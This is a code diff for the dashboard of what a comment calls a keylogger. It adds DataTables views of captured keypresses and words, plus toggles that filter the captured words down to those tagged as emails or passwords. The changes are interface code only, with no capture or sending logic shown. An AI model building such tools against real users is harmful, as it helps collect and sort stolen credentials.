@@ -1,9 +1,9 @@
 $(document).ready(function(){
-    // var data = getKeyData();
-
+    // Initialise toggle buttons
     $('#emailToggle').bootstrapToggle();
     $('#passwordToggle').bootstrapToggle();
 
+    // Initialise and populate keypresses table
     $('#tableKeypresses').DataTable({
         data: getKeyData(),
         columns: [
@@ -15,6 +15,7 @@ $(document).ready(function(){
 
     });
 
+    // Initialise and populate words table
     $('#tableWords').DataTable({
         data: getWordData(),
         columns: [
@@ -27,12 +28,57 @@ $(document).ready(function(){
 
     });
     $('.dataTables_length').addClass('bs-select');
-    //when page loads, show the contents of the keylogger
-    // $('.container > #keyAll').show();
-    // showKeys();
-    // showWords();
+
+    // Search functionality for toggles
+    var keyTable = $('#tableKeypresses').DataTable();
+    var wordTable = $('#tableWords').DataTable();
+    
+    $('#emailToggle').change(function () {
+        if (this.checked) {
+            addSearchParameter("isEmail")
+            wordTable.search(generateSearchQuery()).draw();
+        } else {
+            removeSearchParameter("isEmail")
+            wordTable.search(generateSearchQuery()).draw();
+        }
+    });
+
+    $('#passwordToggle').change(function () {
+        if (this.checked) {
+            // wordTable.search("isPassword").draw();
+            addSearchParameter("isPassword")
+            wordTable.search(generateSearchQuery()).draw();
+        } else {
+            removeSearchParameter("isPassword")
+            wordTable.search(generateSearchQuery()).draw();
+        }
+    });
+
     
 })
+
+// Searches are stored as strings inside an array
+var searches = new Set();
+
+// When passed into datatable, these strings will become a single string,
+//      with each element separated by a space (" ")
+function addSearchParameter(query) {
+    searches.add(query);
+}
+
+function removeSearchParameter(query) {
+    searches.delete(query);
+}
+
+function generateSearchQuery() {
+    strArr = []
+
+    for (str of searches) {
+        strArr.push(str);
+    }
+
+    return strArr.join(" ")
+}
 
 // =========================
 // =
